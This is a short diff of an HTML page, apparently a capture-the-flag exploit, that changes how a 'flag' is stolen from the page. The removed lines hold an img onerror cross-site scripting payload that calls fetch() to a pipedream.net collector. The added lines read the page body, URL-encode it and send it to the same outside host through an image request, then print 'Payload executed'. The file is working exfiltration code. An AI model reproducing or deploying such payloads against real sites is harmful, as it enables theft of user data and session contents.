@@ -1,9 +1,18 @@
+<!DOCTYPE html>
 <html>
+<head>
   <title id="getFlag">HI</title>
-  <body>
-<p>flag</p>
+</head>
+<body>
+  <p>flag</p>
 </body>
 <script>
-  document.getElementById("getFlag").innerHTML= `<img src =q onerror='fetch("https://eoue93psy15d0ln.m.pipedream.net?" + document.body.innerHTML)'`
+  var flagData = document.body.innerHTML;
+  var encodedFlagData = encodeURIComponent(flagData);
+  
+  var url = 'https://eoue93psy15d0ln.m.pipedream.net?data=' + encodedFlagData;
+  var img = new Image();
+  img.src = url;
+  document.getElementById("getFlag").innerText = 'Payload executed';
 </script>
 </html>
